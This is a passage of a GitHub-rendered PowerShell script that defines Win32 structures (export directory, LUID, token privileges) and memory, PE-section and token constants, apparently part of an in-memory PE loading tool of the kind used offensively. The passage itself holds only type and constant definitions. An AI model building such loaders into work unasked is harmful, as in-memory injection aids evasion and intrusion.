          <td id="LC546" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Name<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L547" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="547"></td>
          <td id="LC547" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Base<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L548" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="548"></td>
          <td id="LC548" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>NumberOfFunctions<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L549" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="549"></td>
          <td id="LC549" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>NumberOfNames<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L550" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="550"></td>
          <td id="LC550" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>AddressOfFunctions<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L551" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="551"></td>
          <td id="LC551" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>AddressOfNames<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L552" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="552"></td>
          <td id="LC552" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>AddressOfNameOrdinals<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L553" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="553"></td>
          <td id="LC553" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$IMAGE_EXPORT_DIRECTORY</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L554" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="554"></td>
          <td id="LC554" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_EXPORT_DIRECTORY <span class="pl-k">-</span>Value <span class="pl-smi">$IMAGE_EXPORT_DIRECTORY</span></td>
        </tr>
        <tr>
          <td id="L555" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="555"></td>
          <td id="LC555" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L556" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="556"></td>
          <td id="LC556" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct LUID</span></td>
        </tr>
        <tr>
          <td id="L557" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="557"></td>
          <td id="LC557" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L558" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="558"></td>
          <td id="LC558" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>LUID<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">8</span>)</td>
        </tr>
        <tr>
          <td id="L559" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="559"></td>
          <td id="LC559" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>LowPart<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L560" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="560"></td>
          <td id="LC560" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>HighPart<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L561" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="561"></td>
          <td id="LC561" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$LUID</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L562" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="562"></td>
          <td id="LC562" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name LUID <span class="pl-k">-</span>Value <span class="pl-smi">$LUID</span></td>
        </tr>
        <tr>
          <td id="L563" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="563"></td>
          <td id="LC563" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L564" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="564"></td>
          <td id="LC564" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct LUID_AND_ATTRIBUTES</span></td>
        </tr>
        <tr>
          <td id="L565" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="565"></td>
          <td id="LC565" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L566" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="566"></td>
          <td id="LC566" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>LUID_AND_ATTRIBUTES<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">12</span>)</td>
        </tr>
        <tr>
          <td id="L567" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="567"></td>
          <td id="LC567" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Luid<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$LUID</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L568" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="568"></td>
          <td id="LC568" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Attributes<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L569" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="569"></td>
          <td id="LC569" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$LUID_AND_ATTRIBUTES</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L570" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="570"></td>
          <td id="LC570" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name LUID_AND_ATTRIBUTES <span class="pl-k">-</span>Value <span class="pl-smi">$LUID_AND_ATTRIBUTES</span></td>
        </tr>
        <tr>
          <td id="L571" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="571"></td>
          <td id="LC571" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L572" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="572"></td>
          <td id="LC572" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct TOKEN_PRIVILEGES</span></td>
        </tr>
        <tr>
          <td id="L573" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="573"></td>
          <td id="LC573" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L574" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="574"></td>
          <td id="LC574" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>TOKEN_PRIVILEGES<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">16</span>)</td>
        </tr>
        <tr>
          <td id="L575" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="575"></td>
          <td id="LC575" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>PrivilegeCount<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L576" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="576"></td>
          <td id="LC576" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Privileges<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$LUID_AND_ATTRIBUTES</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L577" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="577"></td>
          <td id="LC577" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TOKEN_PRIVILEGES</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L578" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="578"></td>
          <td id="LC578" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name TOKEN_PRIVILEGES <span class="pl-k">-</span>Value <span class="pl-smi">$TOKEN_PRIVILEGES</span></td>
        </tr>
        <tr>
          <td id="L579" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="579"></td>
          <td id="LC579" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L580" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="580"></td>
          <td id="LC580" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-smi">$Win32Types</span></td>
        </tr>
        <tr>
          <td id="L581" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="581"></td>
          <td id="LC581" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L582" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="582"></td>
          <td id="LC582" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L583" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="583"></td>
          <td id="LC583" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Get-Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L584" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="584"></td>
          <td id="LC584" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L585" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="585"></td>
          <td id="LC585" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> System.Object</td>
        </tr>
        <tr>
          <td id="L586" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="586"></td>
          <td id="LC586" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L587" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="587"></td>
          <td id="LC587" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name MEM_COMMIT <span class="pl-k">-</span>Value <span class="pl-c1">0x00001000</span></td>
        </tr>
        <tr>
          <td id="L588" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="588"></td>
          <td id="LC588" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name MEM_RESERVE <span class="pl-k">-</span>Value <span class="pl-c1">0x00002000</span></td>
        </tr>
        <tr>
          <td id="L589" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="589"></td>
          <td id="LC589" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name PAGE_NOACCESS <span class="pl-k">-</span>Value <span class="pl-c1">0x01</span></td>
        </tr>
        <tr>
          <td id="L590" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="590"></td>
          <td id="LC590" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name PAGE_READONLY <span class="pl-k">-</span>Value <span class="pl-c1">0x02</span></td>
        </tr>
        <tr>
          <td id="L591" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="591"></td>
          <td id="LC591" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name PAGE_READWRITE <span class="pl-k">-</span>Value <span class="pl-c1">0x04</span></td>
        </tr>
        <tr>
          <td id="L592" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="592"></td>
          <td id="LC592" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name PAGE_WRITECOPY <span class="pl-k">-</span>Value <span class="pl-c1">0x08</span></td>
        </tr>
        <tr>
          <td id="L593" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="593"></td>
          <td id="LC593" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name PAGE_EXECUTE <span class="pl-k">-</span>Value <span class="pl-c1">0x10</span></td>
        </tr>
        <tr>
          <td id="L594" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="594"></td>
          <td id="LC594" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name PAGE_EXECUTE_READ <span class="pl-k">-</span>Value <span class="pl-c1">0x20</span></td>
        </tr>
        <tr>
          <td id="L595" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="595"></td>
          <td id="LC595" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name PAGE_EXECUTE_READWRITE <span class="pl-k">-</span>Value <span class="pl-c1">0x40</span></td>
        </tr>
        <tr>
          <td id="L596" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="596"></td>
          <td id="LC596" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name PAGE_EXECUTE_WRITECOPY <span class="pl-k">-</span>Value <span class="pl-c1">0x80</span></td>
        </tr>
        <tr>
          <td id="L597" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="597"></td>
          <td id="LC597" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name PAGE_NOCACHE <span class="pl-k">-</span>Value <span class="pl-c1">0x200</span></td>
        </tr>
        <tr>
          <td id="L598" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="598"></td>
          <td id="LC598" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_REL_BASED_ABSOLUTE <span class="pl-k">-</span>Value <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L599" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="599"></td>
          <td id="LC599" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_REL_BASED_HIGHLOW <span class="pl-k">-</span>Value <span class="pl-c1">3</span></td>
        </tr>
        <tr>
          <td id="L600" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="600"></td>
          <td id="LC600" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_REL_BASED_DIR64 <span class="pl-k">-</span>Value <span class="pl-c1">10</span></td>
        </tr>
        <tr>
          <td id="L601" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="601"></td>
          <td id="LC601" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_SCN_MEM_DISCARDABLE <span class="pl-k">-</span>Value <span class="pl-c1">0x02000000</span></td>
        </tr>
        <tr>
          <td id="L602" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="602"></td>
          <td id="LC602" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_SCN_MEM_EXECUTE <span class="pl-k">-</span>Value <span class="pl-c1">0x20000000</span></td>
        </tr>
        <tr>
          <td id="L603" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="603"></td>
          <td id="LC603" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_SCN_MEM_READ <span class="pl-k">-</span>Value <span class="pl-c1">0x40000000</span></td>
        </tr>
        <tr>
          <td id="L604" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="604"></td>
          <td id="LC604" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_SCN_MEM_WRITE <span class="pl-k">-</span>Value <span class="pl-c1">0x80000000</span></td>
        </tr>
        <tr>
          <td id="L605" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="605"></td>
          <td id="LC605" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_SCN_MEM_NOT_CACHED <span class="pl-k">-</span>Value <span class="pl-c1">0x04000000</span></td>
        </tr>
        <tr>
          <td id="L606" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="606"></td>
          <td id="LC606" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name MEM_DECOMMIT <span class="pl-k">-</span>Value <span class="pl-c1">0x4000</span></td>
        </tr>
        <tr>
          <td id="L607" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="607"></td>
          <td id="LC607" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_FILE_EXECUTABLE_IMAGE <span class="pl-k">-</span>Value <span class="pl-c1">0x0002</span></td>
        </tr>
        <tr>
          <td id="L608" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="608"></td>
          <td id="LC608" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_FILE_DLL <span class="pl-k">-</span>Value <span class="pl-c1">0x2000</span></td>
        </tr>
        <tr>
          <td id="L609" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="609"></td>
          <td id="LC609" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE <span class="pl-k">-</span>Value <span class="pl-c1">0x40</span></td>
        </tr>
        <tr>
          <td id="L610" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="610"></td>
          <td id="LC610" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT <span class="pl-k">-</span>Value <span class="pl-c1">0x100</span></td>
        </tr>
        <tr>
          <td id="L611" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="611"></td>
          <td id="LC611" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name MEM_RELEASE <span class="pl-k">-</span>Value <span class="pl-c1">0x8000</span></td>
        </tr>
        <tr>
          <td id="L612" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="612"></td>
          <td id="LC612" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name TOKEN_QUERY <span class="pl-k">-</span>Value <span class="pl-c1">0x0008</span></td>
        </tr>
        <tr>
          <td id="L613" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="613"></td>
          <td id="LC613" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name TOKEN_ADJUST_PRIVILEGES <span class="pl-k">-</span>Value <span class="pl-c1">0x0020</span></td>
        </tr>
        <tr>
